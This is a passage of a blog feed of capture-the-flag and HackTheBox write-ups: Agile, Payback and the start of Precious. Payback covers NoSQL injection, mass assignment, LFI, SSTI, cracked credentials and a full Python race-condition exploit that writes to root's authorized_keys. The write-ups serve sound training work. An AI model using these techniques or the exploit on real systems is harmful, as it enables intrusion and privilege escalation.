      <li><code class="language-plaintext highlighter-rouge">sudoedit</code> perms to <code class="language-plaintext highlighter-rouge">/app/config_test.json</code> as user/group <code class="language-plaintext highlighter-rouge">dev_admin</code>.</li>
      <li>Identified a cron task running <code class="language-plaintext highlighter-rouge">/app/test_and_update.sh</code> which uses a python virtual env.</li>
      <li>Virtual env setup file is writable to group <code class="language-plaintext highlighter-rouge">dev_admin</code>.</li>
      <li>Exploited it to inject a BASH reverse shell, and got a shell as <code class="language-plaintext highlighter-rouge">root</code>.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="medium" /><category term="werkzeug" /><category term="werkzeug console" /><category term="lfi" /><category term="mysql" /><category term="tunneling" /><category term="sudoedit" /><category term="sudo" /><category term="virtualenv" /><summary type="html"><![CDATA[Agile is a medium linux box by 0xdf featuring a simple web-based LFI that could be used to bypass PIN validation in the Werkzeug debug console. Once on the box, you’ll recover some creds from a MySQL database and gain access to a local user account. You’ll then be required to exploit a previously discovered vulnerability but this time using a local symlink to get through a filter, and then exploit sudoedit and a cron job that uses python’s virtualenv to gain code execution as root.]]></summary></entry><entry><title type="html">Payback - OdysseyCTF</title><link href="https://4g3nt47.github.io/posts/ctf/payback.html" rel="alternate" type="text/html" title="Payback - OdysseyCTF" /><published>2023-07-31T00:00:00+01:00</published><updated>2023-07-31T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/ctf/payback</id><content type="html" xml:base="https://4g3nt47.github.io/posts/ctf/payback.html"><![CDATA[<p><strong>Payback</strong> is a hard-rated box created by <a href="https://github.com/4g3nt47">me</a> for the <a href="https://ctftime.org/event/2029/">OdysseyCTF</a>. It starts with exploiting a <em>NoSQL injection</em> vulnerability in a custom application to bypass registration restrictions, and then a <em>mass assignment</em> vulnerability to escalate to a higher privilege. This exposes an administrative function that’s vulnerable to <em>LFI</em>, which can be used to gain a shell on the box. Once inside, a hidden application running locally can be accessed using a tunnel and a credential recovered from the history file of MongoDB CLI tool. The app is vulnerable to <em>SSTI</em>, and can be exploited to access another local user. Priv-esc to root is by exploiting a <em>race condition</em> in a custom binary that uses <em>libcurl</em> to download files (this part was removed in the instance used for the competition).</p>

<p><br /></p>

<h4 id="recon">Recon</h4>
<p><br /></p>

<p>Going to the web server homepage for this challenge;</p>

<p><img src="/assets/img/Pasted image 20230628021422.png" alt="" /></p>

<p>Clicking the link made a request to an unknown host;</p>

<p><img src="/assets/img/Pasted image 20230628021452.png" alt="" /></p>

<p>After adding this host to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, the page loads successfully;</p>

<p><img src="/assets/img/Pasted image 20230628021815.png" alt="" /></p>

<p>Attempt to create an account through the registration tab failed with the following error;</p>

<p><img src="/assets/img/Pasted image 20230628022023.png" alt="" /></p>

<p>Checking the developer console showed an error with a new subdomain;</p>

<p><img src="/assets/img/Pasted image 20230628022243.png" alt="" /></p>

<p>Adding the host <code class="language-plaintext highlighter-rouge">exa-api.payback.local</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file fixed the issue, and the account was created. However, I was prompted for an activation code, which I do not have;</p>

<p><img src="/assets/img/Pasted image 20230628022536.png" alt="" /></p>

<p>Trying to guess the code didn’t work;</p>

<p><img src="/assets/img/Pasted image 20230628022659.png" alt="" /></p>

<p>The route <code class="language-plaintext highlighter-rouge">/user/activate/&lt;username&gt;</code> is responsible for validating the code;</p>

<p><img src="/assets/img/Pasted image 20230628022839.png" alt="" /></p>

<p>The response headers indicate this is an <em>Express (NodeJS)</em> application running behind an <em>Nginx</em> reverse-proxy. Playing around with the request, the implementation was found to be vulnerable to <em>NoSQL Injection</em> as the application seems to accept a JSON object as the value of <code class="language-plaintext highlighter-rouge">activationCode</code>, which appears to be passed directly to the underlying query. The MongoDB query <code class="language-plaintext highlighter-rouge">{"$ne": 1}</code>, which will evaluate to <code class="language-plaintext highlighter-rouge">true</code> when been matched with anything that is not <code class="language-plaintext highlighter-rouge">1</code>, allowed me to pass the validation;</p>

<p><img src="/assets/img/Pasted image 20230628023612.png" alt="" /></p>

<p>I was then able to login to the web app as the user <code class="language-plaintext highlighter-rouge">guest</code>;</p>

<p><img src="/assets/img/Pasted image 20230628023720.png" alt="" /></p>

<hr />

<p><br /></p>

<h4 id="foothold">Foothold</h4>
<p><br /></p>

<p>Playing around with the available courses didn’t yield anything interesting. <em>WEB101</em> is password-protected, and I had no luck getting in. <em>HIST101</em> is open though;</p>

<p><img src="/assets/img/Pasted image 20230628024020.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230628024145.png" alt="" /></p>

<p>Along with my results for the test, the profile page also has a field for password reset;</p>

<p><img src="/assets/img/Pasted image 20230628024230.png" alt="" /></p>

<p>The feature works, and the request was made to <code class="language-plaintext highlighter-rouge">/user/profile</code>;</p>

<p><img src="/assets/img/Pasted image 20230628024421.png" alt="" /></p>

<p>Going through burp’s history, I noticed that this route also accepts a GET request that returns profile data of the user;</p>

<p><img src="/assets/img/Pasted image 20230628024552.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">admin</code> parameter is very interesting. Since the route seems to be associated with general user profile data, and is also used to update user password, could it be used to update other profile parameters beside the ones featured in the UI? So I made a request that updates the <code class="language-plaintext highlighter-rouge">admin</code> parameter and sets it to <code class="language-plaintext highlighter-rouge">true</code>, and no error was returned;</p>

<p><img src="/assets/img/Pasted image 20230628025014.png" alt="" /></p>

<p>A GET request to the route showed that the update succeeded, although the web UI was not updated in the browser;</p>

<p><img src="/assets/img/Pasted image 20230628025139.png" alt="" /></p>

<p>So I logged out and then logged back in, and a new tab named “Admin” appeared;</p>

<p><img src="/assets/img/Pasted image 20230628025258.png" alt="" /></p>

<p>The “Manage Courses” feature was interesting as I previously had no access to the “WEB101” course. However, there wasn’t any option to get or reset the course password;</p>

<p><img src="/assets/img/Pasted image 20230628025511.png" alt="" /></p>

<p>I tried to export available results, but none was available. Trying the “Export Questions” option worked, and a download for a .json file was initiated. Nothing interesting was found inside the JSON file. However, the URL used for the download stood out;</p>

<p><img src="/assets/img/Pasted image 20230628025737.png" alt="" /></p>

<p>This hints at a possible <em>Local File Inclusion (LFI)</em> vulnerability. After playing around with it, it seems the only security check the application is doing on requested files is making sure that their name starts with “exports/” prior to any path normalization. This makes it vulnerable to LFI via <em>path traversal</em>, and I was able to read local files;</p>

<p><img src="/assets/img/Pasted image 20230628030026.png" alt="" /></p>

<p>Reading <code class="language-plaintext highlighter-rouge">/etc/passwd</code> showed that 2 local users exist: <code class="language-plaintext highlighter-rouge">agent47</code> and <code class="language-plaintext highlighter-rouge">exa</code>. The user <code class="language-plaintext highlighter-rouge">exa</code> is likely the user we are working with as it matches the name of the web app. Since we know SSH is running on the host, I tried to read the user’s SSH key, which should be at <code class="language-plaintext highlighter-rouge">/home/exa/.ssh/id_rsa</code>, and it worked;</p>

<p><img src="/assets/img/Pasted image 20230628030308.png" alt="" /></p>

<p>I saved this key as <code class="language-plaintext highlighter-rouge">exa.key</code> locally, and was able to login through SSH;</p>

<p><img src="/assets/img/Pasted image 20230628030509.png" alt="" /></p>

<hr />

<p><br /></p>

<h4 id="user">User</h4>
<p><br /></p>

<p>The user <code class="language-plaintext highlighter-rouge">exa</code> does not belong to any special groups, nor can we check for SUDO perms as we still don’t have their password. Exploring the home directory of the user, an interesting file <code class="language-plaintext highlighter-rouge">.dbshell</code> was found, which is what the <em>MongoDB</em> client uses as history file for the <em>MongoDB</em> CLI client;</p>

<p><img src="/assets/img/Pasted image 20230628030830.png" alt="" /></p>

<p>Going through the file reveals a possible cred;</p>

<p><img src="/assets/img/Pasted image 20230628030927.png" alt="" /></p>

<p>The password is not used by any of the local user accounts, so I kept it aside and continue to explore. 
As we noticed during recon, the web app was running behind an <em>nginx</em> reverse-proxy, and seems to be using virtual hosts.  Checking the <em>nginx</em> config files at <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/</code>, a new vhost was discovered in the file named <code class="language-plaintext highlighter-rouge">payback</code>;</p>

<p><img src="/assets/img/Pasted image 20230628031333.png" alt="" /></p>

<p>Notice that the vhost was configured to be accessible only to clients in the local network, with the actual server listening locally on port <code class="language-plaintext highlighter-rouge">3000</code>. With our SSH access as user <code class="language-plaintext highlighter-rouge">exa</code>, we can easily setup a tunnel to access this site;</p>

<p><img src="/assets/img/Pasted image 20230628031519.png" alt="" /></p>

<p>The site is now accessible locally on my box through port <code class="language-plaintext highlighter-rouge">3000</code>;</p>

<p><img src="/assets/img/Pasted image 20230628031809.png" alt="" /></p>

<p>It seems to be a site for sharing quotes. Attempt to create an account failed;</p>

<p><img src="/assets/img/Pasted image 20230628031900.png" alt="" /></p>

<p>Remembering the previous credential we discovered in the home of <code class="language-plaintext highlighter-rouge">exa</code> in <code class="language-plaintext highlighter-rouge">.dbshell</code>, I tried it in the login page, and was able to login using <code class="language-plaintext highlighter-rouge">admin:c036c836be2aaea2cb7222fb72eeea3a</code>;</p>

<p><img src="/assets/img/Pasted image 20230628032106.png" alt="" /></p>

<p>We now have the option to add a quote. However, clicking “submit” says the feature is disabled;</p>

<p><img src="/assets/img/Pasted image 20230628032148.png" alt="" /></p>

<p>The “preview” feature is still working though;</p>

<p><img src="/assets/img/Pasted image 20230628032303.png" alt="" /></p>

<p>I started playing with the requests to see if this could be exploited. Like the <em>Exa</em> web app, this app is also powered by <em>Express (NodeJS)</em>. However, this app doesn’t seems to be using a frontend library as the quote entered is submitted to the backend through a POST request to <code class="language-plaintext highlighter-rouge">/api/quote/preview</code>, and a GET request is then made to the same route, which returns a pre-rendered page containing the new quote. So I started testing for <em>Server Side Template Injections (SSTI)</em> in the quote preview feature, as it’s the only place I could inject input, and it payed off! The site is using <em>EJS</em> template engine;</p>

<p><img src="/assets/img/Pasted image 20230628033259.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230628033331.png" alt="" /></p>

<p>I tried a few RCE payloads, but none worked due to lack of access to the <code class="language-plaintext highlighter-rouge">require</code> command, so I moved on. The file <code class="language-plaintext highlighter-rouge">.env</code> is popular with NodeJS applications, and it’s commonly used to store secrets like database credentials and API keys. This file is typically imported using the <code class="language-plaintext highlighter-rouge">dotenv</code> module, which parses and store it into the <code class="language-plaintext highlighter-rouge">process.env</code> object. Using the <em>SSTI</em>, I was able to read this object and obtain the backend database credential;</p>

<p><img src="/assets/img/Pasted image 20230628033655.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230628033729.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230628033822.png" alt="" /></p>

<p>I was able to access the backend DB using the URL <code class="language-plaintext highlighter-rouge">mongodb://qruser:2abe35c9146772663efba402620062a2@localhost/qrdb</code>;</p>

<p><img src="/assets/img/Pasted image 20230628033921.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">users</code> collection looks interesting, so I dumped it. Inside I found username and password hash of 2 users: <code class="language-plaintext highlighter-rouge">admin</code> (which we already have), and <code class="language-plaintext highlighter-rouge">agent47</code> (which is the username of a local user account on the box);</p>

<p><img src="/assets/img/Pasted image 20230628212422.png" alt="" /></p>

<p>The password hash looks to be MD5, so I copied it to a file and tried to crack it using <em>John the Ripper</em>. It worked! The creds are <code class="language-plaintext highlighter-rouge">agent47:angle0164363985</code>;</p>

<p><img src="/assets/img/Pasted image 20230628212734.png" alt="" /></p>

<p>Testing this cred against the local user account of <code class="language-plaintext highlighter-rouge">agent47</code>, I was able to login;</p>

<p><img src="/assets/img/Pasted image 20230628212948.png" alt="" /></p>

<hr />

<p><br /></p>

<h4 id="privesc">PrivEsc</h4>
<p><br /></p>

<p>Apart from the source files of the <em>QuotesRank</em> web app, nothing of much interest was found in the home dir of <code class="language-plaintext highlighter-rouge">agent47</code>. Checking for SUDO showed that the user has sudo rights on what seems to be a custom binary;</p>

<p><img src="/assets/img/Pasted image 20230628213401.png" alt="" /></p>

<p>So I copied this over to my box for analysis. The binary seems to be a simple utility for downloading files from a given URL. The program uses the CURL library (<code class="language-plaintext highlighter-rouge">libcurl</code>) for making web requests;</p>

<p><img src="/assets/img/Pasted image 20230628213833.png" alt="" /></p>

<p>The IDA decompiler (shortcut: <code class="language-plaintext highlighter-rouge">F5</code>) did a very good job of reversing the binary. Going through the code, the program accepts 2 arguments as shown in the usage message: the first one being the URL, and the second one being the output file to write to. It then proceed to take the basename of the output file given using the <code class="language-plaintext highlighter-rouge">basename()</code> function provided in <code class="language-plaintext highlighter-rouge">libgen.h</code> (likely to prevent path traversal) and append it to the string <code class="language-plaintext highlighter-rouge">/opt/downloads/</code>. It then checks if the new path generated exists by trying to open it for read. If it succeed, it indicates the file exists, and the program exits with code <code class="language-plaintext highlighter-rouge">2</code>;</p>

<p><img src="/assets/img/Pasted image 20230628214755.png" alt="" /></p>

<p>This indicates the program does not want us to overwrite existing files during download. It then proceeds to create a custom buffer and calls <code class="language-plaintext highlighter-rouge">http_get()</code> with the URL and buffer as arguments. The <code class="language-plaintext highlighter-rouge">http_get()</code> function is what handles the actual file download. It uses CURL and writes the complete body of the HTTP response to the given buffer (with the aid of the function <code class="language-plaintext highlighter-rouge">body_receiver()</code>);</p>

<p><img src="/assets/img/Pasted image 20230628215411.png" alt="" /></p>

<p>Once the <code class="language-plaintext highlighter-rouge">http_get()</code> function finished the download, it returns, and the <code class="language-plaintext highlighter-rouge">main()</code> function writes the contents of the buffer to the output file;</p>

<p><img src="/assets/img/Pasted image 20230628215540.png" alt="" /></p>

<p>Notice that the file is opened for writing only after the HTTP request has been completed, which takes time. Since the program does not perform another check to make sure the requested output file does not exist this time, this creates a <em>race condition</em> vulnerability.</p>

<p>An interesting way to exploit this vulnerability is using <em>symbolic links</em>, which are special files that point other files, acting like some sort of proxy. If we can get the program to write to a symlink that points to a critical file on the system, we may be able to write arbitrary data to any file on the system since we are running <code class="language-plaintext highlighter-rouge">dloader</code> as root. The major obstacle to this is that all downloads are saved to <code class="language-plaintext highlighter-rouge">/opt/downlaods/</code>. However, this directory is owned by <em>root</em> and belongs to the group <em>devs</em>, which is interesting because the user <code class="language-plaintext highlighter-rouge">agent47</code> also belongs to that group;</p>

<p><img src="/assets/img/Pasted image 20230628220644.png" alt="" /></p>

<p>Thanks to the group permission, we can now write to the <code class="language-plaintext highlighter-rouge">/opt/downloads</code> directory. After a couple of tests, I was able to develop a PoC that exploits the <em>race condition</em> to overwrite the SSH key of the root user;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
#--------------------------------------------------------------------------------
#   An exploit for the race condition affecting `dloader` for the privesc part of
# Payback (Web) - OdysseyCTF (agent47 =&gt; root)
#   It exploits the race condition to add the public part of an SSH key to the 
# 'authorized_keys' file of the root user. 
# Killchain;
# 1. Creates a public and private SSH key pair.
# 2. Creates a simple socket server to serve the public key for download.
# 3. Once a request is received for the public key, it indicates the file check
# has already been performed, so the program exploits the race condition by crea-
# ing a dangling symbolic link to '/root/.ssh/authorized_keys'
# 4. The exploit then sends the public key contents, which the dloader executable
# writes to the symbolic link.
# 5. The program then uses the private key created earlier to authenticate.  
#                                                                 Author: 4g3nt47
#--------------------------------------------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">random</span>

<span class="c1"># For generating random alpha-numeric strings.
</span><span class="k">def</span> <span class="nf">randstr</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
  <span class="n">rstr</span> <span class="o">=</span> <span class="s">""</span>
  <span class="n">chars</span> <span class="o">=</span> <span class="s">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span>
  <span class="k">while</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">size</span> <span class="o">-=</span> <span class="mi">1</span>
    <span class="n">rstr</span> <span class="o">+=</span> <span class="n">chars</span><span class="p">[</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)]</span>
  <span class="k">return</span> <span class="n">rstr</span>

<span class="c1"># Where the magic happens...
</span><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
  <span class="n">password</span> <span class="o">=</span> <span class="s">"angle0164363985"</span> <span class="c1"># agent47's password required for using 'sudo'
</span>  <span class="n">os</span><span class="p">.</span><span class="n">chdir</span><span class="p">(</span><span class="s">"/dev/shm"</span><span class="p">)</span>         <span class="c1"># A writable dir for writing temporary files.
</span>  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Creating SSH keys..."</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"ssh-keygen -N '' -f exploit.key"</span><span class="p">)</span> <span class="c1"># Creates exploit.key and exlpoit.key.pub
</span>  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Starting server..."</span><span class="p">)</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
  <span class="n">s</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
  <span class="n">port</span> <span class="o">=</span> <span class="mi">4747</span>
  <span class="n">s</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[+] Server started!"</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Executing 'sudo /usr/bin/dloader'..."</span><span class="p">)</span>
  <span class="n">outfile</span> <span class="o">=</span> <span class="n">randstr</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"echo %s | sudo -S /usr/bin/dloader http://127.0.0.1:%d %s &amp;"</span> <span class="o">%</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">outfile</span><span class="p">))</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Waiting for request..."</span><span class="p">)</span>
  <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[+] Client connected: %s..."</span> <span class="o">%</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Creating dangling symlink to '/root/.ssh/authorized_keys'..."</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"ln -s /root/.ssh/authorized_keys /opt/downloads/%s"</span> <span class="o">%</span><span class="p">(</span><span class="n">outfile</span><span class="p">))</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Sending public key..."</span><span class="p">)</span>
  <span class="n">pubkey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"exploit.key.pub"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
  <span class="n">rsp</span> <span class="o">=</span> <span class="s">"HTTP/1.0 200 OK</span><span class="se">\r\n</span><span class="s">Server: SimpleHTTP/0.6 Python/3.7.3</span><span class="se">\r\n</span><span class="s">Content-type: text/plain; charset=utf-8</span><span class="se">\r\n</span><span class="s">Content-Length: %d</span><span class="se">\r\n\r\n</span><span class="s">"</span> <span class="o">%</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pubkey</span><span class="p">))</span>
  <span class="n">rsp</span> <span class="o">+=</span> <span class="n">pubkey</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">rsp</span><span class="p">)</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
  <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Attempting SSH login as root..."</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"ssh -i exploit.key root@127.0.0.1"</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Cleanup..."</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"exploit.key"</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"exploit.key.pub"</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"/opt/downloads/"</span> <span class="o">+</span> <span class="n">outfile</span><span class="p">)</span>
  <span class="k">return</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  <span class="n">exploit</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It worked, and I was able to login as <code class="language-plaintext highlighter-rouge">root</code> and get the flag :)</p>

<p><img src="/assets/img/Pasted image 20230628221209.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230628221242.png" alt="" /></p>

<hr />

<p><br /></p>

<h4 id="summary">Summary</h4>
<p><br /></p>

<ul>
  <li>Challenge exposes port 20022 (OpenSSH) and 20080 (Nginx)</li>
  <li>Nginx homepage links to <code class="language-plaintext highlighter-rouge">exa.payback.local:20080</code>;
    <ul>
      <li>Web app has a registration form, but an “activation code” is required to complete registration.</li>
      <li>The code validation is vulnerable to <em>NoSQL Injection</em>, making it possible to bypass the check.</li>
      <li>Profile page has password reset feature handled by <code class="language-plaintext highlighter-rouge">/user/profile</code> route.</li>
      <li>The implementation is vulnerable to <em>mass assignment</em> vulnerability that allows privesc to site administrator.</li>
      <li>Administrator has access to the “Export Questions” feature in course management page, which is vulnerable to LFI, and can be used to load the SSH key of a local user named <code class="language-plaintext highlighter-rouge">exa</code> at <code class="language-plaintext highlighter-rouge">/home/exa/.ssh/id_rsa</code></li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">exa</code>;
    <ul>
      <li>A credential for a user named <code class="language-plaintext highlighter-rouge">admin</code> was found in <code class="language-plaintext highlighter-rouge">.dbshell</code>, which is the history file of MongoDB client.</li>
      <li><code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/payback</code> showed that another VHOST exists locally, with the hidden server listening on port <code class="language-plaintext highlighter-rouge">3000</code>.</li>
      <li>Setup an SSH tunnel to port <code class="language-plaintext highlighter-rouge">3000</code> for access from my box, and the credential found in <code class="language-plaintext highlighter-rouge">.dbshell</code> worked for the web application.</li>
      <li>Quote preview feature is vulnerable to SSTI (EJS), which I exploited to leak <code class="language-plaintext highlighter-rouge">process.env</code> and obtain DB creds.</li>
      <li>DB creds gave me access to the backend DB, and recovered a hash for a user account named <code class="language-plaintext highlighter-rouge">agent47</code>.</li>
      <li>Hash was cracked successfully using <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, and worked for the local user account of <code class="language-plaintext highlighter-rouge">agent47</code>.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">agent47</code>;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">sudo -l</code> showed SUDO perms to <code class="language-plaintext highlighter-rouge">/usr/bin/dloader</code>, which is a custom HTTP downloader.</li>
      <li><code class="language-plaintext highlighter-rouge">dloader</code> attempts to prevent us from writing to existing files, but it has a <em>race condition</em> vulnerability.</li>
      <li>Exploited the program to overwrite the SSH key of the <em>root</em> user, which allowed me to login and get the flag at <code class="language-plaintext highlighter-rouge">/root/flag.txt</code></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="ctf" /><category term="ctf" /><category term="web" /><category term="express" /><category term="svelte" /><category term="nodejs" /><category term="NoSQL injection" /><category term="mongodb" /><category term="mass assignment" /><category term="lfi" /><category term="ssh" /><category term="tunneling" /><category term="ssti" /><category term="ejs" /><category term="race condition" /><category term="libcurl" /><summary type="html"><![CDATA[Payback is a hard-rated box created by me for the OdysseyCTF. It starts with exploiting a NoSQL injection vulnerability in a custom application to bypass registration restrictions, and then a mass assignment vulnerability to escalate to a higher privilege. This exposes an administrative function that’s vulnerable to LFI, which can be used to gain a shell on the box. Once inside, a hidden application running locally can be accessed using a tunnel and a credential recovered from the history file of MongoDB CLI tool. The app is vulnerable to SSTI, and can be exploited to access another local user. Priv-esc to root is by exploiting a race condition in a custom binary that uses libcurl to download files (this part was removed in the instance used for the competition).]]></summary></entry><entry><title type="html">Precious - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/precious.html" rel="alternate" type="text/html" title="Precious - HackTheBox" /><published>2023-05-20T00:00:00+01:00</published><updated>2023-05-20T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/precious</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/precious.html"><![CDATA[<p><strong>Precious</strong> is a very easy linux machine on <em>HackTheBox</em>. It starts with exploiting a web application that generates a PDF file based on the output of a URL. Lateral movement to a local user involves finding a password in a configuration file, and a custom <em>YAML deserialization</em> exploit to elevate to <em>root</em>.</p>

<p><br /></p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230325061650.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230325061731.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Wed Mar 15 07:29:11 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.189
Nmap scan report for 10.10.11.189
Host is up (0.46s latency).
Not shown: 992 closed ports
PORT      STATE    SERVICE           VERSION
22/tcp    open     ssh               OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp    open     http              nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 15 07:30:57 2023 -- 1 IP address (1 host up) scanned in 106.44 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>Site is a <em>web page to PDF converter</em>;</p>

<p><img src="/assets/img/Pasted image 20230325062726.png" alt="" /></p>

<p>Giving it the URL to a web server running on my host, I got a request, and a PDF download was initiated with the contents of the web page;</p>

<p><img src="/assets/img/Pasted image 20230325063224.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230325063056.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230325071135.png" alt="" /></p>

<p>Attempts to use the <code class="language-plaintext highlighter-rouge">file://</code> protocol to read local files kept failing. Using <code class="language-plaintext highlighter-rouge">netcat</code> to capture the request headers, the <em>user agent</em> looks interesting;</p>

<p><img src="/assets/img/Pasted image 20230325063510.png" alt="" /></p>

<p><strong>wkhtmltopdf</strong> is a utility for converting HTML pages to PDF. My searches for exploits lead me to <a href="http://hassankhanyusufzai.com/SSRF-to-LFI/">this article</a>, but had no luck with it on the box. Looking at the metadata of the generated PDF file;</p>

<p><img src="/assets/img/Pasted image 20230325063817.png" alt="" /></p>

<p>Looking for vulnerabilities lead me to <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">CVE-2022-25765</a>;</p>

<p><img src="/assets/img/Pasted image 20230325064748.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230325064812.png" alt="" /></p>

<p>I used it to spawn a reverse shell on the box as <em>ruby</em>;</p>

<p><img src="/assets/img/Pasted image 20230325065000.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="user">User</h3>
<p><br /></p>

<p><em>Ruby</em> does not have <code class="language-plaintext highlighter-rouge">user.txt</code>. Another user in the box exists with the name <em>henry</em>. Looking into <em>ruby’s</em> home directory, the creds of <em>henry</em> were found in <code class="language-plaintext highlighter-rouge">/home/ruby/.bundle/config</code>;</p>

<p><img src="/assets/img/Pasted image 20230325065343.png" alt="" /></p>

<p>Using this password, I was able to login to the box as <em>henry</em> over SSH;</p>

<p><img src="/assets/img/Pasted image 20230325065455.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

